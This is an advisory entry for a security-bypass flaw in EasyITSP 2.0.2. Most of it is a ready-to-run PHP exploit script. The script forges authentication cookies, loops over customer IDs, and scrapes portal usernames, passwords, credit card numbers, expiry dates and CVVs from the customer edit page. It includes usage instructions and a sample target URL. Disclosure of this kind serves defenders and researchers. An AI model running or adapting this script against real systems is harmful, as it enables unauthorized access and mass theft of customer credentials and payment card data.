source: http://www.securityfocus.com/bid/56321/info

EasyITSP is prone to a security-bypass vulnerability.

An attacker can exploit this issue to bypass certain security restrictions and gain unauthorized access to customer's information.

EasyITSP 2.0.2 is vulnerable; other versions may also be affected. 

<?php
error_reporting(0);
$arguments = getopt("a:b:c:");
$url = $arguments['a'];
$id_pod =$arguments['b'];
$id_end =$arguments['c'];
if(count($arguments)!=3)
{
echo '## Exploit - EasyITSP by Lemens Telephone Systems 2.0.2   '."\n";
echo '## Discovery users with passwords  		 	 '."\n";
echo '##						 	 '."\n";
echo '## Author: Michal Blaszczak 			 	 '."\n";
echo '## Website: blaszczakm.blogspot.com	         	 '."\n";
echo '## Date: 10.10.2012				  	'."\n";
echo '##						 	 '."\n";
echo '## Greatz: cond, packet, jestemka1pi, sid, chez            '."\n";
echo '##         #pakamera@freenode 				'."\n";
echo '##         (old) #2600@ircnet 				'."\n";
echo '##         (old) #mamo_mamo_jestem_chakerem@ircnet	'."\n";
echo '##						  	'."\n";
echo '## Usage:						  	'."\n";
echo '## php exploit.php -a URL -b ID_START -c ID_STOP     	'."\n";
echo '##						  	'."\n";
echo '## Example:					  	'."\n";
echo '## php exploit.php -a http://lemens-ts.com/easyitsp/customer/ -b
5 -c 10'."\n";




exit;
}
$url2='customers_edit.php?currentpage=customers';
$url.=$url2;
for ($id_pod; $id_pod <= $id_end; $id_pod++) { $cookie = 'cust_verify=' . urlencode('#pakamera') . '; cust_id=' .
urlencode($id_pod);
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_HEADER, 1); curl_setopt($ch, CURLOPT_COOKIE, $cookie); curl_setopt($ch, CURLOPT_POST, 1);//przesylamy metod. post curl_setopt($ch, CURLOPT_POSTFIELDS, "customersid=$id_pod"); //dane do wyslania curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $intro = curl_exec($ch); curl_close($ch);




$regex_login = '#\<td title="Customer username for 
portal"\>(.+?)\<\/td\>#s';
preg_match($regex_login, $intro, $login);




$regex_pass = '#\<td title="Customer password for portal"><input
type="password" name="password" required="1" maxlength="45"
value="(.+?)"\>\<\/td\>#s';
preg_match($regex_pass, $intro, $pass);




$regex_ccnum = '#\<td title="Customer cc number"><input type="text"
name="ccnumber" maxlength="20" value="(.+?)"\>\<\/td\>#s';
preg_match($regex_ccnum, $intro, $ccnum);




$regex_ccexpire = '#\<td title="Customer cc expire"><input type="text"
name="ccexpire" maxlength="8" value="(.+?)"\>\<\/td\>#s';
preg_match($regex_ccexpire, $intro, $ccexpire);




$regex_cccvv = '#\<td title="Customer credit card CVV"><input
type="text" name="cccvv" maxlength="6" value="(.+?)"\>\<\/td\>#s';
preg_match($regex_cccvv, $intro, $cccvv);








	$test = explode(" ",$login[1]);








	if(trim($test[0])!='</td>')
	{
	echo 'ID:'.$id_pod."\n";
	echo 'LOGIN:'.$login[1]."\n";
	echo 'Password:'.$pass[1]."\n";
	echo 'CCnumber:'.$ccnum[1]."\n";
	echo 'CCexpire:'.$ccexpire[1]."\n";
	echo 'CCCVV:'.$cccvv[1]."\n\n";
	}
}




?>

